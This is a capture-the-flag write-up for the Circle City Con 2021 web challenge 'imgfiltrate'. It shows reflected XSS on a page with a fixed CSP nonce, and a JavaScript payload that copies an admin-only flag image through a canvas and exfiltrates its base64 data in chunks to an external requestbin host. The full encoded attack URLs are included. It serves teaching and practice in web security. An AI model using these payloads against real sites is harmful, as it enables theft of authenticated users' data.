# Circle City Con CTF 2021 [web] imgfiltrate writeup

## Challenge

Can you yoink an image from the admin page?

App: http://35.224.135.84:3200
Admin bot: http://35.224.135.84:3201

Author: qxxxb

```
Hint! In this challenge there are two services: the web app and the admin bot.

docker-compose creates an internal network for these two services, and the web app has an internal hostname set to imgfiltrate.hub.

Note that the admin bot's cookie is set for this internal domain, not the external domain at 35.224.135.84. This means that when you submit a URL to the admin bot, you must do something like:
http://imgfiltrate.hub/<stuff>
```

## Solution

Check the source code, there is CSP settings.

`app/public/index.php`

```html
<meta http-equiv="Content-Security-Policy" content="default-src 'none'; img-src 'self'; script-src 'nonce-70861e83ad7f1863b3020799df93e450';">
```

This site only allows images of the same origin and script tags with nonces as external resources.

We can embed any code into html with the get parameter.

`app/public/index.php`

```php
Hello <?php echo $_GET['name'] ?? 'bozo' ?>
```

Also, the CSP nonce is fixed, so you can check the xss at this URL.

```
http://35.224.135.84:3200/?name=<script nonce="70861e83ad7f1863b3020799df93e450">alert(1)</script>
```

And the purpose of the attack is an image that is only displayed when the bot accesses this site.

(The cookie "token" has the httpOnly attribute, so it cannot be retrieved by XSS.)

`app/public/flag.php`

```php
<?php

header('Content-Type: image/png');

if (isset($_COOKIE['token']) && $_COOKIE['token'] === getenv('TOKEN')) {
    $filepath = '/opt/flag.png';
} else {
    $filepath = '/opt/no_flag.png';
}

echo file_get_contents($filepath);
```

`bot/main.js`

```javascript
  await page.setCookie({
    name: 'token',
    value: process.env.TOKEN,
    domain: 'imgfiltrate.hub',
    sameSite: 'strict',
    httpOnly: true
  })

  try {
    await page.goto(url, { timeout: 5000, waitUntil: 'networkidle2' })
    await page.waitForTimeout(2000)
  } finally {
    await page.close()
    await ctx.close()
  }
```

Therefore, the attack is the following procedure

1. Create a new script tag using `document.createElement`.

2. Convert flag images to base64 data.

3. Send the image data externally with the "src" of the script tag generated in 1.

```html
  <script nonce="70861e83ad7f1863b3020799df93e450">
    // 1. Create a new script tag using `document.createElement`.
    var oScript = document.createElement("script");
    oScript.nonce = "70861e83ad7f1863b3020799df93e450";
    oScript.type = "text\/javascript";
    document.currentScript.parentNode.insertBefore(oScript, document.currentScript);
    // Wait one second for the image to load.
    setTimeout(function () {
      // 2. Convert flag images to base64 data.
      var img = document.getElementById("flag");
      var canvas = document.createElement('canvas');
      var ctx = canvas.getContext('2d');
      canvas.width = img.width;
      canvas.height = img.height;
      ctx.drawImage(img, 0, 0);
      var data = canvas.toDataURL('image/jpeg');
      var data2 = data.replace(/^.*,/, '').replace(/\//g, '-').substring(0, 5000);
      // 3. Send the image data externally with the "src" of the script tag generated in 1.
      oScript.src = `https://x.pipedream.net/?a=${data2}`;
    }, "1000");
  </script>
```

Minify this code to make it read as XSS.

```html
<script nonce="70861e83ad7f1863b3020799df93e450">var oScript = document.createElement("script");oScript.nonce = "70861e83ad7f1863b3020799df93e450";oScript.type = "text\/javascript";document.currentScript.parentNode.insertBefore(oScript, document.currentScript);setTimeout(function () {var img = document.getElementById("flag");var canvas = document.createElement('canvas');var ctx = canvas.getContext('2d');canvas.width = img.width;canvas.height = img.height;ctx.drawImage(img, 0, 0);var data = canvas.toDataURL('image/jpeg');var data2 = data.replace(/^.*,/, '').replace(/\//g, '-').substring(0, 5000);oScript.src = `https://x.pipedream.net/?a=${data2}`;},"1000");</script>
```

The image data is large and exceeds the length that can be specified in the url, so we will split it into three parts.

By sending these URLs to the bot, base64 encoded image data will be sent to the requestbin.

```
http://imgfiltrate.hub/?name=%3Cscript%20nonce=%2270861e83ad7f1863b3020799df93e450%22%3Evar%20oScript%20=%20document.createElement(%22script%22);oScript.nonce%20=%20%2270861e83ad7f1863b3020799df93e450%22;oScript.type%20=%20%22text%5C/javascript%22;document.currentScript.parentNode.insertBefore(oScript,%20document.currentScript);setTimeout(function%20()%20%7Bvar%20img%20=%20document.getElementById(%22flag%22);var%20canvas%20=%20document.createElement('canvas');var%20ctx%20=%20canvas.getContext('2d');canvas.width%20=%20img.width;canvas.height%20=%20img.height;ctx.drawImage(img,%200,%200);var%20data%20=%20canvas.toDataURL('image/jpeg');var%20data2%20=%20data.replace(/%5E.*,/,%20'').replace(/%5C//g,%20'-').substring(0,%205000);oScript.src%20=%20%60https://x.pipedream.net/?a=$%7Bdata2%7D%60;%7D,%221000%22);%3C/script%3E

http://imgfiltrate.hub/?name=%3Cscript%20nonce=%2270861e83ad7f1863b3020799df93e450%22%3Evar%20oScript%20=%20document.createElement(%22script%22);oScript.nonce%20=%20%2270861e83ad7f1863b3020799df93e450%22;oScript.type%20=%20%22text%5C/javascript%22;document.currentScript.parentNode.insertBefore(oScript,%20document.currentScript);setTimeout(function%20()%20%7Bvar%20img%20=%20document.getElementById(%22flag%22);var%20canvas%20=%20document.createElement('canvas');var%20ctx%20=%20canvas.getContext('2d');canvas.width%20=%20img.width;canvas.height%20=%20img.height;ctx.drawImage(img,%200,%200);var%20data%20=%20canvas.toDataURL('image/jpeg');var%20data2%20=%20data.replace(/%5E.*,/,%20'').replace(/%5C//g,%20'-').substring(5000,%2010000);oScript.src%20=%20%60https://x.pipedream.net/?a=$%7Bdata2%7D%60;%7D,%221000%22);%3C/script%3E

http://imgfiltrate.hub/?name=%3Cscript%20nonce=%2270861e83ad7f1863b3020799df93e450%22%3Evar%20oScript%20=%20document.createElement(%22script%22);oScript.nonce%20=%20%2270861e83ad7f1863b3020799df93e450%22;oScript.type%20=%20%22text%5C/javascript%22;document.currentScript.parentNode.insertBefore(oScript,%20document.currentScript);setTimeout(function%20()%20%7Bvar%20img%20=%20document.getElementById(%22flag%22);var%20canvas%20=%20document.createElement('canvas');var%20ctx%20=%20canvas.getContext('2d');canvas.width%20=%20img.width;canvas.height%20=%20img.height;ctx.drawImage(img,%200,%200);var%20data%20=%20canvas.toDataURL('image/jpeg');var%20data2%20=%20data.replace(/%5E.*,/,%20'').replace(/%5C//g,%20'-').substring(10000,%2015000);oScript.src%20=%20%60https://x.pipedream.net/?a=$%7Bdata2%7D%60;%7D,%221000%22);%3C/script%3E
```

We can then display this data in the following html to get the flag.

```html
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>test</title>
</head>
<body>
  <canvas id="cvs" width="500" height="200"></canvas>
  <script>
    var data = "data:image/jpeg;base64,/9j/4AAQSkZJRgA...AAAAH//2Q==";
    var cvs = document.getElementById('cvs');
    var ctx = cvs.getContext('2d');
    var img = new Image();
    img.src = data;
    img.onload = function () {
      ctx.drawImage(img, 0, 0, 500, 200);
    }
  </script>
</body>
</html>
```

```
CCC{c4nvas_b64}
```
